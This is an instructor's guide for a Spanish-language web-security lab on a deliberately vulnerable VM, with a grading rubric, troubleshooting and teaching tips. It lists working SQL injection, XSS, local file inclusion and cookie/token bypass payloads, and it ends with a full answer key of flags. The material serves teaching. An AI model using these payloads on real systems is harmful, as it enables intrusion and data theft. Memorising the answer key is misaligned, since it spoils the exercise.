|----------|--------|--------------|
| Flag captured | 5 | Correct flag: `EM{l0c4l_f1l3_1nclus10n_p3tr0l30}` |
| Exploitation steps | 5 | Clear steps from login to file access |
| Target file accessed | 5 | Successfully reads `/etc/energia-marina-secret.conf` |
| Screenshots | 3 | URLs with payloads, file contents with flag |
| Remediation recommendations | 2 | Whitelist approach, basename(), realpath() validation |

**Bonus Points (up to 3 extra):**
- Accesses multiple system files (+2)
- Uses Burp/ZAP to automate (+1)
- Reads config.php or other web files (+2)

#### Vulnerability 4: Security Misconfiguration (10 points)

| Criteria | Points | Requirements |
|----------|--------|--------------|
| Flag captured | 3 | Correct flag: `EM{m1sc0nf1gur4t10n_gul0_mex1c0}` |
| Found via Nikto | 2 | Nikto scan identifies info.php |
| Found phpinfo page | 2 | Accessed /info.php |
| Found .git or directory listing | 2 | Evidence of additional misconfigurations |
| Remediation recommendations | 1 | Remove phpinfo, disable directory listing, protect .git |

**Bonus Points (up to 2 extra):**
- Identifies all misconfigurations (phpinfo, .git, directory listing) (+2)

#### Vulnerability 5: Broken Authentication (10 points)

| Criteria | Points | Requirements |
|----------|--------|--------------|
| Flag captured | 3 | Correct flag: `EM{br0k3n_4uth_3n3rg14_m4r1n4}` |
| Exploitation method | 3 | Clear description of bypass technique (cookie or token) |
| Screenshots | 2 | DevTools showing manipulation, admin panel with flag |
| Multiple bypass methods | 1 | Shows both cookie AND token methods |
| Remediation recommendations | 1 | Session-based auth, secure cookies, no predictable tokens |

**Bonus Points (up to 3 extra):**
- Uses multiple tools (DevTools, Burp, cURL) (+2)
- Provides detailed explanation of why bypass works (+1)

#### Documentation Quality (10 points)

| Criteria | Points | Requirements |
|----------|--------|--------------|
| Professional formatting | 2 | Clear headers, sections, proper markdown/formatting |
| Complete command history | 2 | All commands documented with outputs |
| Clear screenshots | 2 | All screenshots are clear, labeled, and relevant |
| Executive summary | 2 | High-level summary suitable for management |
| Technical depth | 2 | Sufficient technical detail for reproduction |

### Grade Boundaries

| Grade | Percentage | Points |
|-------|------------|--------|
| A+ | 95-100% | 95-100 |
| A | 90-94% | 90-94 |
| A- | 85-89% | 85-89 |
| B+ | 80-84% | 80-84 |
| B | 75-79% | 75-79 |
| B- | 70-74% | 70-74 |
| C+ | 65-69% | 65-69 |
| C | 60-64% | 60-64 |
| D | 50-59% | 50-59 |
| F | 0-49% | 0-49 |

### Special Considerations

**Incomplete Flags:**
- If a student captures some but not all flags, grade the completed sections
- Partial credit for documented attempts on missed flags

**Creative Solutions:**
- Award bonus points for creative or alternative exploitation methods
- Encourage out-of-the-box thinking

**Tool Usage:**
- Prefer manual exploitation with tool assistance
- Full automation (e.g., only using SQLMap) should receive fewer points than manual + tool verification

---

## Common Student Mistakes

### Mistake 1: Not Reading Error Messages

**Problem:** Students submit SQL injection payloads and don't notice SQL error messages in responses.

**Solution:** Teach them to:
- Check browser DevTools Network tab
- Read full HTML responses
- Enable Burp/ZAP to see full responses

### Mistake 2: Forgetting to Login Before LFI

**Problem:** Students try to access `dashboard.php?doc=` without logging in first.

**Error:** Redirect to login.php

**Solution:** Emphasize the importance of session management and that some vulnerabilities require authentication.

### Mistake 3: Not URL-Encoding Special Characters

**Problem:** Students use payloads with spaces or special characters without encoding.

**Example:**
```
# Wrong
dashboard.php?doc=/etc/secret file.conf

# Correct
dashboard.php?doc=/etc/secret%20file.conf
```

**Solution:** Teach URL encoding basics or use Burp Suite's automatic encoding.

### Mistake 4: Not Checking HTML Source for Hidden Flags

**Problem:** Students see info.php but don't view source to find the flag comment.

**Solution:** Always emphasize:
- View page source (Ctrl+U)
- Check HTML comments
- Inspect elements

### Mistake 5: Trying Complex XSS Payloads First

**Problem:** Students use advanced evasion techniques before trying basic `<script>alert()</script>`.

**Solution:** Teach progressive testing:
1. Start simple
2. If filtered, try alternatives
3. Use encoding only if needed

### Mistake 6: Not Capturing Session Cookies for cURL

**Problem:** Students try to use cURL for authenticated pages without session cookies.

**Error:** Redirect to login or access denied

**Solution:** Show how to:
```bash
# Get session cookie from browser
# Use it with cURL
curl -b "PHPSESSID=abc123..." "http://..."
```

### Mistake 7: Giving Up on Token Guessing Too Early

**Problem:** Students try 2-3 tokens for broken auth and give up.

**Solution:** Teach enumeration mindset:
- Try common patterns
- Check for hints in error messages
- Consider the context (year, company name, etc.)

### Mistake 8: Poor Screenshot Quality

**Problem:** Screenshots are blurry, cut off, or don't show relevant information.

**Solution:** Provide screenshot checklist:
- Full browser window (showing URL bar)
- Zoom appropriate for readability
- Highlight or arrow to important parts
- Include caption/description

### Mistake 9: Not Using Burp/ZAP Effectively

**Problem:** Students run automated scans but don't verify findings manually.

**Solution:** Teach the workflow:
1. Run automated scan
2. Review findings
3. Manually verify each vulnerability
4. Document manual verification steps

### Mistake 10: Copying Payloads Without Understanding

**Problem:** Students copy-paste payloads from the internet without understanding how they work.

**Solution:** Require explanation:
- "Explain why this payload works"
- "What would happen if you changed X?"
- "What is the server-side code doing?"

---

## Troubleshooting

### Issue 1: VM Won't Get an IP Address

**Symptoms:**
- `vagrant up` completes but no IP displayed
- Can't access website

**Causes:**
- Bridged network interface incorrect
- DHCP not available on network
- VirtualBox network adapter issues

**Solutions:**

**Solution 1:** Check and update bridged interface
```bash
# List network interfaces
ip link show

# Update Vagrantfile line ~21
config.vm.network "public_network", bridge: "your_interface_name"

# Reload VM
vagrant reload
```

**Solution 2:** Use static IP instead
```ruby
# In Vagrantfile, replace public_network with:
config.vm.network "private_network", ip: "192.168.56.10"
```

**Solution 3:** Check VirtualBox network settings
```bash
# Stop VM
vagrant halt

# In VirtualBox GUI:
# File > Host Network Manager
# Ensure vboxnet0 exists with DHCP enabled

# Restart VM
vagrant up
```

### Issue 2: Database Connection Errors

**Symptoms:**
- "Error de conexión" messages
- Login form doesn't work
- White pages

**Causes:**
- MariaDB not running
- Database not initialized
- Permissions issues

**Solutions:**

**Solution 1:** Restart MariaDB
```bash
vagrant ssh
sudo rc-service mariadb restart
sudo rc-service mariadb status
```

**Solution 2:** Reinitialize database
```bash
vagrant ssh
sudo mysql -e "DROP DATABASE IF EXISTS energia_marina;"
# Then destroy and recreate VM
exit
vagrant destroy -f
vagrant up
```

**Solution 3:** Check logs
```bash
vagrant ssh
sudo tail -f /var/log/mariadb/mariadb.log
```

### Issue 3: Nginx Not Serving Pages

**Symptoms:**
- Connection refused
- 502 Bad Gateway
- Can ping VM but can't access web

**Causes:**
- Nginx not running
- PHP-FPM not running
- Configuration errors

**Solutions:**

**Solution 1:** Restart services
```bash
vagrant ssh
sudo rc-service nginx restart
sudo rc-service php-fpm82 restart
sudo rc-service nginx status
sudo rc-service php-fpm82 status
```

**Solution 2:** Check Nginx configuration
```bash
vagrant ssh
sudo nginx -t
```

**Solution 3:** Check logs
```bash
vagrant ssh
sudo tail -f /var/log/nginx/error.log
```

### Issue 4: SQL Injection Not Working

**Symptoms:**
- Payloads result in "Usuario o contraseña incorrectos"
- No SQL errors displayed

**Causes:**
- Special characters being escaped by browser
- Magic quotes enabled (unlikely in modern PHP)
- Payload syntax errors

**Solutions:**

**Solution 1:** Try different payloads
```
admin' OR 1=1--
admin' OR '1'='1
admin'--
admin' #
```

**Solution 2:** Use Burp Suite/ZAP
- Intercept request
- Modify POST parameters directly
- Ensure no unwanted encoding

**Solution 3:** Check for spaces in payload
```
# Use + or %20 for spaces in URLs
admin'%20OR%20'1'='1
```

### Issue 5: XSS Not Triggering

**Symptoms:**
- Script tag visible as text
- No alert dialog
- Flag not displayed

**Causes:**
- HTML entities being encoded (unlikely in this lab)
- Browser XSS protection
- Payload errors

**Solutions:**

**Solution 1:** Disable browser XSS protection
```
# Chrome
chrome://settings/security
Disable "Safe Browsing"

# Or use different browser (Firefox)
```

**Solution 2:** Try alternative payloads
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

**Solution 3:** Check the Recent Messages section
- Scroll down to "Mensajes Recientes"
- XSS should execute there
- Flag appears in success message, not in messages section

### Issue 6: LFI Not Reading Files

**Symptoms:**
- Empty file display
- "Document not found" messages
- Page doesn't change

**Causes:**
- Not logged in
- Wrong file path
- File permissions

**Solutions:**

**Solution 1:** Ensure you're logged in
```
# Login with SQL injection first
Username: admin'--
Password: (anything)

# Then try LFI
http://<IP>/dashboard.php?doc=/etc/passwd
```

**Solution 2:** Use absolute paths
```
# This works
/etc/passwd

# This might not work
../../../etc/passwd
```

**Solution 3:** Try common files first
```
/etc/passwd
/etc/hosts
/etc/energia-marina-secret.conf
```

### Issue 7: Can't Access Admin Panel

**Symptoms:**
- "Acceso Denegado" message persists
- Cookie manipulation doesn't work
- Token parameter doesn't work

**Causes:**
- Wrong cookie name or value
- Browser cache
- Incorrect token

**Solutions:**

**Solution 1:** Clear browser cache and cookies
```
Ctrl+Shift+Delete
Clear everything
Try again
```

**Solution 2:** Use exact token
```
# Exact token (case-sensitive)
admin_access_2024

# URL
http://<IP>/admin/index.php?token=admin_access_2024
```

**Solution 3:** Use Incognito/Private mode
- Avoid cookie conflicts
- Fresh session

**Solution 4:** Use cURL to verify
```bash
curl "http://<IP>/admin/index.php?token=admin_access_2024" | grep -i flag
```

### Issue 8: Nikto Scan Hangs or Crashes

**Symptoms:**
- Nikto runs for hours
- System becomes unresponsive
- Incomplete results

**Causes:**
- Too many simultaneous connections
- Network issues
- VM resource constraints

**Solutions:**

**Solution 1:** Use targeted tuning
```bash
# Instead of full scan
nikto -h http://<IP> -Tuning 123459

# Tuning codes:
# 1 - Interesting File / Seen in logs
# 2 - Misconfiguration
# 3 - Information Disclosure
# 4 - Injection (XSS/Script/HTML)
# 5 - Remote File Retrieval
# 9 - SQL Injection
```

**Solution 2:** Reduce threads
```bash
nikto -h http://<IP> -Tuning 9 -timeout 10
```

**Solution 3:** Use ZAP instead
- ZAP is more stable for classroom use
- Better GUI for students

### Issue 9: Student Can't Find Flags

**Symptoms:**
- Exploit works but no flag visible
- Not sure where to look

**Guidance for Students:**

**SQL Injection:**
- Flag appears on dashboard.php after admin login
- Large green success box

**XSS:**
- Flag appears immediately after form submission
- In the success message at top of page

**LFI:**
- Flag is in the file `/etc/energia-marina-secret.conf`
- Displayed in the "document viewer" section

**Misconfiguration:**
- Flag is in HTML comment in source of info.php
- Press Ctrl+U to view source

**Broken Auth:**
- Flag appears on admin panel page after bypass
- Large green success box

---

## Teaching Tips

### Pre-Lab Preparation

**1. VM Setup Check (Do this before class)**
```bash
cd lab2
vagrant up
# Wait for provisioning
vagrant ssh -c "curl -I http://localhost"
# Should return 200 OK
vagrant ssh -c "ip -4 addr show eth1"
# Note the IP
```

**2. Test All Vulnerabilities**
- Go through each exploitation method
- Verify all flags are accessible
- Document the exact IP address

**3. Prepare Demo Environment**
- Have a working VM ready
- Prepare screenshots in advance
- Test with student accounts

### During Lab Introduction (30-45 minutes)

**1. Demo Reconnaissance (15 min)**
```bash
# Show live
nmap -sV -sC -p 80 <VM_IP>
nikto -h http://<VM_IP>
```

- Explain each finding
- Show how to interpret results
- Emphasize note-taking

**2. Demo One Vulnerability (15 min)**
- Choose SQL Injection (easiest)
- Show payload crafting process
- Explain why it works
- Show flag capture

**3. Explain Documentation Requirements (10 min)**
- Show example report structure
- Emphasize screenshot requirements
- Explain grading rubric

**4. Q&A (5 min)**

### Suggested Hints to Give (If Stuck)

**After 1 hour - General Hints:**
- "Remember, reconnaissance is key. What did Nikto find?"
- "Try viewing the source code of pages you find."
- "Some vulnerabilities require you to be logged in first."

**After 2 hours - Specific Hints:**

**For SQL Injection:**
- "What happens if you close the quote in the username field?"
- "Try commenting out the rest of the query with --"

**For XSS:**
- "The form doesn't validate input. What if you include HTML tags?"
- "Check what happens after you submit a message."

**For LFI:**
- "Notice the ?doc= parameter. What if you specify a different file?"
- "Try using absolute paths like /etc/passwd"

**For Misconfiguration:**
- "What interesting files did Nikto find?"
- "Remember to view source, not just the rendered page."

**For Broken Auth:**
- "Read the hint message carefully - it tells you what to check."
- "Can you modify cookies using browser DevTools?"

**After 3 hours - Direct Hints:**
- Point to specific files or parameters
- Show example payload structure (but not complete)
- Allow students to work in pairs

### Progressive Disclosure Strategy

**Beginner Level (Week 1-2 of course):**
- Provide complete step-by-step guide
- Show exact commands
- Grade on completion

**Intermediate Level (Week 3-6 of course):**
- Provide vulnerability locations
- Students figure out exploitation
- Grade on methodology

**Advanced Level (Week 7+ of course):**
- Only provide IP address
- Students find everything
- Grade on thoroughness and creativity

### Lab Variations for Different Skill Levels

**Easy Mode:**
- Provide the ASSIGNMENT.md with clear hints
- Allow unlimited time
- Permit tool automation (SQLMap, etc.)

**Medium Mode:**
- Provide general guidance only
- 4-hour time limit
- Must show manual exploitation before tools

**Hard Mode:**
- Only provide IP address
- 3-hour time limit
- Must document defensive recommendations
- Bonus: Write working patches for vulnerabilities

### Discussion Topics After Lab

**1. Real-World Impact**
- "What could an attacker do with SQL injection in a real oil company?"
- "Why is XSS dangerous even if it 'just' shows an alert?"

**2. Defense in Depth**
- "If we fixed just one vulnerability, which should it be?"
- "What would a complete security strategy look like?"

**3. Ethical Considerations**
- "What are the legal implications of testing without permission?"
- "How do responsible disclosure programs work?"

**4. Career Connections**
- "What certifications cover these skills? (CEH, OSCP, GWAPT)"
- "What job roles perform penetration testing?"

### Assessment Alternatives

**Option 1: Live Demonstration (Oral Exam)**
- Student exploits vulnerabilities live
- Explains each step verbally
- Instructor asks probing questions
- 20-30 minutes per student

**Option 2: Capture The Flag (CTF) Style**
- Students only submit flags
- Speed bonus for fastest completions
- Class leaderboard
- More competitive

**Option 3: Purple Team Exercise**
- Divide class into Red Team (attack) and Blue Team (defend)
- Red Team finds vulnerabilities
- Blue Team must patch while maintaining functionality
- Both teams grade each other

**Option 4: Report Writing Focus**
- Less emphasis on finding all flags
- More emphasis on professional documentation
- Must include executive summary
- Mimics real penetration testing reports

### Resources to Share with Students

**Tools:**
- Burp Suite Community: https://portswigger.net/burp/communitydownload
- OWASP ZAP: https://www.zaproxy.org/download/
- Nikto: Pre-installed on Kali Linux

**Learning Resources:**
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- PentesterLab: https://pentesterlab.com/

**Practice Environments:**
- DVWA (Damn Vulnerable Web Application)
- WebGoat
- HackTheBox
- TryHackMe

### Extension Activities

**For Fast Finishers:**

**1. Write Proof-of-Concept Exploits**
```python
# Python script to automate SQL injection
import requests

payloads = ["admin'--", "admin' OR '1'='1"]
for payload in payloads:
    # ... test payload
```

**2. Create Patches**
```php
// Provide fixed versions of vulnerable code
// Compare with original
```

**3. Additional Challenges:**
- Extract all employee passwords
- Modify production data
- Chain multiple vulnerabilities
- Create a video walkthrough

**4. Research Assignment:**
- Find real-world examples of these vulnerabilities
- Research major breaches caused by similar issues
- Present findings to class

---

## Appendix A: Quick Reference Commands

### Reconnaissance
```bash
# Nmap scan
nmap -sV -sC -p 80 <VM_IP>

# Nikto scan
nikto -h http://<VM_IP>

# OWASP ZAP quick scan
zap-cli quick-scan http://<VM_IP>

# Check what ports are open
nmap -p- <VM_IP>
```

### SQL Injection
```
# Login bypasses
admin'--
admin' OR '1'='1
admin'#
' OR 1=1--

# UNION injection
admin' UNION SELECT NULL,@@version,NULL,NULL,NULL,NULL--
```

### XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

### LFI
```
http://<VM_IP>/dashboard.php?doc=/etc/passwd
http://<VM_IP>/dashboard.php?doc=/etc/hosts
http://<VM_IP>/dashboard.php?doc=/etc/energia-marina-secret.conf
http://<VM_IP>/dashboard.php?doc=/var/www/energia-marina/config.php
```

### Misconfiguration
```
http://<VM_IP>/info.php
http://<VM_IP>/.git/config
http://<VM_IP>/docs/
http://<VM_IP>/admin/
```

### Broken Authentication
```
# URL parameter
http://<VM_IP>/admin/index.php?token=admin_access_2024

# Cookie in browser console
document.cookie = "admin_level=1"

# cURL
curl -b "admin_level=1" http://<VM_IP>/admin/index.php
curl "http://<VM_IP>/admin/index.php?token=admin_access_2024"
```

### VM Management
```bash
# Start VM
vagrant up

# Get IP
vagrant ssh -c "ip -4 addr show eth1 | grep inet"

# SSH into VM
vagrant ssh

# Restart services
vagrant ssh -c "sudo rc-service nginx restart"

# Check logs
vagrant ssh -c "sudo tail -f /var/log/nginx/error.log"

# Restart VM
vagrant reload

# Stop VM
vagrant halt

# Delete VM
vagrant destroy
```

---

## Appendix B: Database Schema

```sql
-- Employees table
CREATE TABLE empleados (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) UNIQUE,
  password VARCHAR(50),
  nombre VARCHAR(100),
  departamento VARCHAR(50),
  nivel_acceso VARCHAR(20)
);

-- Flags table
CREATE TABLE flags (
  id INT AUTO_INCREMENT PRIMARY KEY,
  flag_name VARCHAR(50),
  flag_value VARCHAR(100),
  descripcion TEXT
);

-- Messages table (XSS)
CREATE TABLE mensajes (
  id INT AUTO_INCREMENT PRIMARY KEY,
  nombre VARCHAR(100),
  email VARCHAR(100),
  asunto VARCHAR(200),
  mensaje TEXT,
  fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Production data table
CREATE TABLE produccion (
  id INT AUTO_INCREMENT PRIMARY KEY,
  fecha DATE,
  plataforma VARCHAR(50),
  barriles_diarios INT,
  estado VARCHAR(20)
);
```

---

## Appendix C: Answer Key Summary

| Vulnerability | Location | Flag | Method |
|---------------|----------|------|--------|
| SQL Injection | login.php | `EM{5ql_1nj3ct10n_3n_v3r4cruz}` | `admin'--` in username |
| XSS | contacto.php | `EM{cr0ss_s1t3_scr1pt1ng_m4r1n0}` | `<script>alert('XSS')</script>` in message |
| LFI | dashboard.php?doc= | `EM{l0c4l_f1l3_1nclus10n_p3tr0l30}` | `doc=/etc/energia-marina-secret.conf` |
| Misconfiguration | info.php | `EM{m1sc0nf1gur4t10n_gul0_mex1c0}` | View source of info.php |
| Broken Auth | admin/index.php | `EM{br0k3n_4uth_3n3rg14_m4r1n4}` | `?token=admin_access_2024` or cookie `admin_level=1` |

---

**END OF TEACHERS GUIDE**

*This document is confidential and intended for instructors only. Do not share with students.*

*Last Updated: February 15, 2026*
*Lab Version: 1.0*
*Author: Miguel Guirao*
